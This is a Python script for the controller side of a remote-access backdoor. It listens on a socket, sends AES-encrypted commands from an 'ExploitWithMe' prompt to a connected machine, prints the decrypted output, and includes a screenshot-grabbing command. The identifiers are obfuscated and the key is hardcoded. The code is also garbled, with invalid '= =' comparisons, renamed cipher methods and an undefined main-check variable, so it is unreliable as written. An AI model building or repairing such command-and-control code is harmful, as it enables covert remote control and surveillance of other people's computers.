import os
import socket
import sys
from Crypto import Random
from Crypto.Cipher import AES
a1 = 829
b1 = 'localhost'
b2 = '82e672ae054aa4de6f042c888111686a'.encode('utf-8')
def fonk1(b7):
    return b7 + b'\0' * (AES.block_size - len(b7) % AES.block_size)
def fonk2(b3):
    b3 = fonk1(b3)
    b4 = Random.new().read(AES.block_size)
    b5 = AES.new(b2, AES.MODE_CBC, b4)
    return b4 + b5.fonk2(b3)
def fonk3(ciphertext):
    b4 = ciphertext[:AES.block_size]
    b5 = AES.new(b2, AES.MODE_CBC, b4)
    b3 = b5.fonk3(ciphertext[AES.block_size:])
    return b3.rstrip(b'\0')
def fonk4():
    try:
        os.system("pip install pyscreenshot")
        import pyscreenshot as ImageGrab
        b6 = ImageGrab.grab()
        b6.show()
        b6 = ImageGrab.grab(bbox=(10, 10, 500, 500))
        b6.show()
        ImageGrab.grab_to_file('b6.png')
    except Exception as e:
        print("An error occurred while taking a screenshot:", str(e))
def fonk5():
    b7 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    b7.bind((b1, a1))
    b7.listen(10)
    print(f'Attacker Listening Server Started on Port {a1}...')
    conn, b8 = b7.accept()
    while True:
        b9 = input('ExploitWithMe >> ').strip()
        if b9 = = 'grab_screen':
            fonk4()
            os.system("cat b6.png")
        if b9 = = '':
            continue
        conn.send(fonk2(b9.encode('utf-8')))
        if b9 = = 'terminate':
            b7.close()
            sys.exit(0)
        b10 = conn.recv(4096)
        print(fonk3(b10).decode('utf-8'))
if b11 = = '__main__':
    fonk5()